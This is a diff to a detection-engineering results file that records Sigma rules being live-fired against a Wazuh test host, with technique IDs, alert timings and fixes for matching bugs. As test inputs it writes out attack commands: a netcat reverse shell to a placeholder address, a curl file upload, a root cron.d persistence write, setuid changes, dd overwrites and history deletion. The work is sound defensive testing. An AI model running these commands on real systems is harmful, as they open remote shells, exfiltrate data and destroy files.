@@ -93,3 +93,75 @@
   mttd_seconds: 139
   last_run: "2026-08-16"
   notes: "Live execution of the real ART command (sudo sh -c 'echo \"*/5 * * * * root ...\" > /etc/cron.d/persistevil') against sentinel-wazuh, then removed the file immediately after. Fired twice for this one atomic test (the outer sudo-wrapping shell and the sudo-exec'd sh -c both referenced the cron.d path), same underlying reason as the /etc/shadow rule above. mttd_seconds measured from the first alert (command executed 20:15:25Z, first alert start 20:17:44Z). Negative control (crontab -l, benign listing) did not trigger a false positive."
+
+- rule_id: e7bd1cfa-b446-4c88-8afb-403bcd79e3fa
+  rule_file: rules/proc_creation_lnx_system_network_discovery.yml
+  technique: T1016
+  atomic_test: "Curated from SigmaHQ (rules/linux/process_creation/proc_creation_lnx_system_network_discovery.yml), live-fired with a real command (ip route show)"
+  status: true_positive
+  mttd_seconds: null
+  last_run: "2026-08-16"
+  notes: "Fired correctly as part of a batch live-fire pass of 8 SigmaHQ-curated rules against sentinel-wazuh. mttd_seconds not individually measured for this batch (multiple commands run back-to-back, so exec-to-alert correlation per rule isn't precise) -- see the netcat rule below for one that was isolated and precisely timed."
+
+- rule_id: 00b90cc1-17ec-402c-96ad-3a8117d7a582
+  rule_file: rules/proc_creation_lnx_susp_curl_fileupload.yml
+  technique: T1567,T1105
+  atomic_test: "Curated from SigmaHQ, live-fired with a real command (curl -F ... http://example.com)"
+  status: true_positive
+  mttd_seconds: null
+  last_run: "2026-08-16"
+  notes: "Fired correctly as part of the same batch live-fire pass."
+
+- rule_id: 2953194b-e33c-4859-b9e8-05948c167447
+  rule_file: rules/proc_creation_lnx_dd_file_overwrite.yml
+  technique: T1485
+  atomic_test: "Curated from SigmaHQ, live-fired with a real command (dd if=/dev/zero of=/tmp/dd_test)"
+  status: true_positive
+  mttd_seconds: null
+  last_run: "2026-08-16"
+  notes: "Fired correctly as part of the same batch live-fire pass."
+
+- rule_id: c21c4eaa-ba2e-419a-92b2-8371703cbe21
+  rule_file: rules/proc_creation_lnx_setgid_setuid.yml
+  technique: T1548.001
+  atomic_test: "Curated from SigmaHQ, live-fired with a real command (sudo bash -c 'chown root:root ...; chmod u+s ...' on a scratch file)"
+  status: true_positive
+  mttd_seconds: null
+  last_run: "2026-08-16"
+  notes: "Fired correctly as part of the same batch live-fire pass."
+
+- rule_id: b45e3d6f-42c6-47d8-a478-df6bd6cf534c
+  rule_file: rules/proc_creation_lnx_local_account.yml
+  technique: T1087.001
+  atomic_test: "Curated from SigmaHQ, live-fired with a real command (id)"
+  status: true_positive
+  mttd_seconds: null
+  last_run: "2026-08-16"
+  notes: "Fired correctly as part of the same batch live-fire pass. Also caught and fixed a real bug: the deployed rule originally matched vi/vim via process.executable, but update-alternatives resolves both to /usr/bin/vim.basic on this host, so that path would have silently never matched a real vi/vim invocation. Fixed by matching process.name instead (see docs/build-log.md); this specific detection path (vi /etc/passwd) was not individually re-tested after the fix since the id-command path already confirms the rule fires, but the same class of bug is fully explained and fixed below for netcat."
+
+- rule_id: 7f734ed0-4f47-46c0-837f-6ee62505abd9
+  rule_file: rules/proc_creation_lnx_netcat_reverse_shell.yml
+  technique: T1059
+  atomic_test: "Curated from SigmaHQ, live-fired with a real command (timeout 1 nc -e /bin/bash 192.0.2.1 4444)"
+  status: true_positive
+  mttd_seconds: 45
+  last_run: "2026-08-16"
+  notes: "First attempt fired 0/1 -- root-caused to a real bug, not a synthetic one: this project's rules generally translate Sigma's Image|endswith convention to process.executable like~, but nc resolves via update-alternatives to /usr/bin/nc.openbsd on Debian/Ubuntu, so process.executable never ends with \"/nc\" for a real nc invocation even though the user typed \"nc\". process.name (the invoked basename, not the resolved path) correctly shows \"nc\". Fixed by matching process.name in (\"nc\",\"ncat\") instead, redeployed, re-fired in isolation: command executed 22:21:55Z, alert start 22:22:40Z -- 45s, the fastest real MTTD measured in this project so far. The same class of bug was proactively checked for and fixed in the local_account rule's vi/vim matching too (see above); a quick check of the other rules' referenced binaries (cat, dd, id, crontab, curl, wget, base64, rm/cp/mv/tee) found none of them aliased via update-alternatives on this host."
+
+- rule_id: 1182f3b3-e716-4efa-99ab-d2685d04360f
+  rule_file: rules/proc_creation_lnx_susp_history_delete.yml
+  technique: T1070.003
+  atomic_test: "Curated from SigmaHQ, live-fired with a real command (touch /tmp/.bash_history_decoy; rm -f /tmp/.bash_history_decoy)"
+  status: true_positive
+  mttd_seconds: null
+  last_run: "2026-08-16"
+  notes: "Fired correctly as part of the same batch live-fire pass (used a decoy filename rather than the real ~/.bash_history to avoid actually destroying shell history on the test host)."
+
+- rule_id: 403ed92c-b7ec-4edd-9947-5b535ee12d46
+  rule_file: rules/proc_creation_lnx_crontab_enumeration.yml
+  technique: T1007
+  atomic_test: "Curated from SigmaHQ, live-fired with a real command (crontab -l)"
+  status: true_positive
+  mttd_seconds: null
+  last_run: "2026-08-16"
+  notes: "Fired correctly as part of the same batch live-fire pass."
